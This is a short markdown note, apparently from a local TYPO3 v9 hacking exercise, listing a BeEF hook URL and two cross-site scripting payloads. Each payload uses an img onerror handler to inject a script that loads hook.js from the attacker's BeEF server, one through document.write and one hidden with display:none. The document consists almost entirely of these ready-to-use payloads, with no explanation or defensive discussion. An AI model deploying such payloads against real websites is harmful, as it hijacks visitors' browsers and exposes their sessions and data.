# Just BeEF

* the payload

```
http://typo3v9-hack.ddev.local:3000/hook.js
```

* 1st attempt

```
Great!<img src="great" onerror="quot=String.fromCharCode(34);document.write('<script src='+quot+'http://typo3v9-hack.ddev.local:3000/hook.js'+quot+'></script>')">
```

* 2nd attempts

```
Great!<img src="great" style="display:none" onerror="script=document.createElement('script');script.src= 'http://typo3v9-hack.ddev.local:3000/hook.js';document.body.append(script);">
```
